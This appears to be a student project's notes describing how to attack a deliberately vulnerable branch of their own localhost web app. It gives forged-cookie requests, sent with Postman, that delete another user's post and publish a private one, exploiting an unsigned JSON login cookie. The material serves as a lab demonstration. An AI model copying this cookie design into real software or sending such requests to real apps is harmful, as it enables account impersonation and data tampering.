How to attack my app!! :

pranch name : Non_Safe_From_CSRF_Virsion

first example:
1. open Postman and add the current cookie ->
   LogInToken={"user":{"username":"user3","email":"user3@gmail.com","name":"user3","id":30}}; Path=/; Expires=Fri, 26 Jul 2024 09:14:43 GMT;
   you can get user cookie also by url ...
2. send a delete request to http://localhost:3000/api/post/postId this user have published posts that u can find at
page number 3 at Public Feed , u can use postId =30  ,http://localhost:3000/api/post/30

secend example:
lets publish a privet post !!
1. open Postman and add the current cookie ->
   LogInToken={"user":{"username":"user3","email":"user3@gmail.com","name":"user3","id":30}}; Path=/; Expires=Fri, 26 Jul 2024 09:14:43 GMT;
   you can get user cookie also by url ..
2. send PUT request to http://localhost:3000/api/publish/33

